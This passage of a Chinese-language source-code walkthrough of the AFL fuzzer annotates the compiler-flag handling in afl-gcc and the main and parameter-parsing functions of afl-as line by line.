class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时存在环境变量 AFL_USE_MSAN 则报错</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and AFL_HARDEN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同时存在环境变量 AFL_HARDEN 则报错</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-U_FORTIFY_SOURCE"</span><span class="token punctuation">;</span><span class="token comment">//参数加上 -U_FORTIFY_SOURCE</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fsanitize=address"</span><span class="token punctuation">;</span><span class="token comment">//参数加上 -fsanitize=address</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//同上</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and MSAN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"MSAN and AFL_HARDEN are mutually exclusive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-U_FORTIFY_SOURCE"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fsanitize=memory"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_DONT_OPTIMIZE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span></span>    <span class="token comment">//源码注释翻译：在 64 位 FreeBSD 系统上，clang -g -m32 出现故障，但 -m32 本身可以正常工作</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>clang_mode <span class="token operator">||</span> <span class="token operator">!</span>m32_set<span class="token punctuation">)</span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-g"</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span><span class="token comment">//因为不是 FreeBSD 系统所以直接在参数后面加 -g,用于在编译时生成调试信息</span></span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-g"</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-O3"</span><span class="token punctuation">;</span><span class="token comment">//加上参数 -O3,启用一系列优化措施，以提高程序的运行速度和效率</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-funroll-loops"</span><span class="token punctuation">;</span><span class="token comment">//加上参数 -funroll-loops,启用循环展开优化减少循环控制的开销</span>    <span class="token comment">//源码注释翻译：您正在为模糊测试构建两个指标；其中一个是 AFL 专用的，另一个与 libfuzzer 共享</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-D__AFL_COMPILER=1"</span><span class="token punctuation">;</span><span class="token comment">//指示编译器正在使用 AFL</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"</span><span class="token punctuation">;</span><span class="token comment">//指示当前的编译模式是为模糊测试准备的，而不是用于生产环境</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_NO_BUILTIN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在环境变量 AFL_NO_BUILTIN</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcmp"</span><span class="token punctuation">;</span><span class="token comment">//禁用编译器对 strcmp 函数的内置优化,确保代码使用标准库中定义的 strcmp 函数</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strncmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcasecmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strncasecmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-memcmp"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strstr"</span><span class="token punctuation">;</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fno-builtin-strcasestr"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//参数列表末尾加上 NULL 表示结束</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p>大致和 afl-gcc 的 main 差不多</p><ul><li>获取环境变量 AFL_INST_RATIO 赋值到 inst_ratio_str</li><li>输出 afl-as 版本信息</li><li>判断没有参数就退出</li><li>获取时间根据时间和进程号生成随机数种子</li><li>调用 edit_params 解析参数</li><li>inst_ratio_str 不在 0-100 则退出</li><li>获取环境变量 AS_LOOP_ENV_VAR 为 1 则退出，为 0 则设置为 1</li><li>如果存在环境变量 AFL_USE_ASAN &#x2F; AFL_USE_MSAN 则降低 inst_ratio_str 以降低 AFL 的覆盖率检测频率减少对程序性能的影响</li><li>调用 add_instrumentation 函数对程序进行插桩</li><li>fork 新进程使用 execvp 执行 afl_as &#x2F; as</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  u8<span class="token operator">*</span> inst_ratio_str <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_INST_RATIO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//AFL 的指令覆盖率,用于指定 AFL 在代码中插入覆盖率检测代码的比例</span>  <span class="token comment">//值的范围是 0 到 100，表示百分比</span>  <span class="token comment">//如果值为 100，表示 AFL 会在所有可能的指令位置插入覆盖率检测代码，这会提供最全面的覆盖率，但可能会显著降低程序的运行速度</span>  <span class="token comment">//如果值为 0，则表示不插入任何覆盖率检测代码，这通常用于非模糊测试场景</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  clang_mode <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span>CLANG_ENV_VAR<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_QUIET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span>cCYA <span class="token string">"afl-as "</span> cBRI VERSION cRST <span class="token string">" by &lt;lcamtuf@google.com>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> be_quiet <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">gettimeofday</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tz<span class="token punctuation">)</span><span class="token punctuation">;</span>  rand_seed <span class="token operator">=</span> tv<span class="token punctuation">.</span>tv_sec <span class="token operator">^</span> tv<span class="token punctuation">.</span>tv_usec <span class="token operator">^</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srandom</span><span class="token punctuation">(</span>rand_seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取时间生成随机数种子</span>  <span class="token function">edit_params</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//处理参数</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>inst_ratio_str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sscanf</span><span class="token punctuation">(</span>inst_ratio_str<span class="token punctuation">,</span> <span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inst_ratio<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> inst_ratio <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Bad value of AFL_INST_RATIO (must be between 0 and 100)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//指令覆盖率不在 0-100 之间则报错</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>AS_LOOP_ENV_VAR<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//防止在调用 as（汇编器）时出现无限循环调用as</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Endless loop when calling 'as' (remove '.' from your PATH)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">setenv</span><span class="token punctuation">(</span>AS_LOOP_ENV_VAR<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置为1表示已经被调用过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    sanitizer <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    inst_ratio <span class="token operator">/=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//降低 AFL 的覆盖率检测频率，以减少对程序性能的影响，同时让内存检测工具能够更有效地运行</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">//AFL_USE_ASAN：启用 AddressSanitizer（ASan），一种内存错误检测工具,以检测堆栈和堆缓冲区上溢/下溢 释放之后的堆使用情况</span>    <span class="token comment">//AFL_USE_MSAN：启用 MemorySanitizer（MSan），一种未初始化内存检测工具</span>    <span class="token comment">//源码注释：使用 ASAN 进行编译时，我们没有特别优雅的方法来跳过特定于 ASAN 的分支。但我们可以通过概率来弥补这一点</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>just_version<span class="token punctuation">)</span> <span class="token function">add_instrumentation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序不是只需要输出版本信息的时候，对程序进行插桩</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">execvp</span><span class="token punctuation">(</span>as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>as_params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fork新建进程之后执行参数列表</span>    <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Oops, failed to execute '%s' - check your PATH"</span><span class="token punctuation">,</span> as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"waitpid() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_KEEP_ASSEMBLY"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">unlink</span><span class="token punctuation">(</span>modified_file<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><p>处理参数、获取环境变量</p><ul><li>获取环境变量 AFL_AS 给 afl_as</li><li>依次获取环境变量TMPDIR &#x2F; 环境变量 TEMP &#x2F; 环境变量 TMP &#x2F; &#x2F;tmp，最先获取到的赋值给 tmp_dir</li><li>给 as_params 数组开辟空间，如果 afl_as 存在则将第一个参数设置为 afl_as，否则设置为 as</li><li>循环遍历参数函数参数，存在 –64 就设置 use_64bit 为 1，存在 –32 就设置 use_64bit 为 0，并且将参数添加到 as_params</li><li>从 as_params 中获取 input_file<ul><li>如果是 –version 则表示只需要输出版本信息，just_version 设置为 1</li><li>如果是 - 开头但不是 –version 则报错</li><li>如果只有 - 则输入文件为空</li></ul></li><li>如果 input_file 不以 tmp_dir &#x2F; &#x2F;var&#x2F;tmp&#x2F; &#x2F; &#x2F;tmp&#x2F; 开头，则设置 pass_thru 为 1，表示输入文件不是一个标准的编译过程中的临时文件</li><li>生成修改后的文件路径：tmp_dir&#x2F;.afl-getpid()-time(NULL).s</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">edit_params</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 <span class="token operator">*</span>tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TMPDIR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span>afl_as <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_AS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从环境变量中获取临时目录和 afl_as 的路径</span>  u32 i<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token comment">//源码注释翻译：虽然没有记录，但当未设置 TMPDIR 时，GCC 也会使用 TEMP 和 TMP。我们需要检查这些非标准变量，以便稍后正确处理 pass_thru 逻辑。</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TEMP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"TMP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tmp_dir<span class="token punctuation">)</span> tmp_dir <span class="token operator">=</span> <span class="token string">"/tmp"</span><span class="token punctuation">;</span>  <span class="token comment">//设置 tmp_dir 为 环境变量 TMPDIE / TEMP / 环境变量TMP / /tmp（按优先级顺序获取，不存在则获取下一个）</span>  as_params <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>argc <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为 as 参数开辟空间</span>  as_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> afl_as <span class="token operator">?</span> afl_as <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token comment">//存在 afl_as 就将第一个参数设置为 afl_as,不存在就设置为 as</span>  as_params<span class="token punctuation">[</span>argc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//将数组最后一位设置为 0 表示结束</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//循环遍历参数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"--64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> use_64bit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//参数存在 --64 就设置 use_64bit 为 1</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"--32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> use_64bit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//参数存在 --32 就设置 use_64bit 为 0</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>    as_params<span class="token punctuation">[</span>as_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//将参数赋值到参数列表数组中</span>  <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  input_file <span class="token operator">=</span> argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取 input_file</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>input_file <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"-version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//input_file = --version表示只需要显示版本信息</span>      just_version <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      modified_file <span class="token operator">=</span> input_file<span class="token punctuation">;</span>      <span class="token keyword">goto</span> wrap_things_up<span class="token punctuation">;</span><span class="token comment">//设置 just_version 为 1，输出文件为输入文件</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Incorrect use (not called through afl-gcc?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输入文件是 - 开头但不是 --version 则输出报错信息</span>      <span class="token keyword">else</span> input_file <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//输入文件是 - 则输入文件为空</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> tmp_dir<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp_dir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"/var/tmp/"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">strncmp</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"/tmp/"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> pass_thru <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果 input_file 不以 tmp_dir / /var/tmp/ / /tmp/ 开头，则设置 pass_thru 为 1,用于判断输入文件是否是一个标准的编译过程中的临时文件，还是一个用户手动指定的 .s 文件（汇编文件）。如果是非标准路径，pass_thru 被设置为 1，表示需要特殊处理。</span>  <span class="token punctuation">&#125;</span>  modified_file <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.afl-%u-%u.s"</span><span class="token punctuation">,</span> tmp_dir<span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                               <span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成修改后的文件路径：tmp_dir/.afl-getpid()-time(NULL).s</span>wrap_things_up<span class="token operator">:</span>  as_params<span class="token punctuation">[</span>as_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> modified_file<span class="token punctuation">;</span>  as_params<span class="token punctuation">[</span>as_par_cnt<span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//将 modified_file 添加到参数列表 as_params 中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 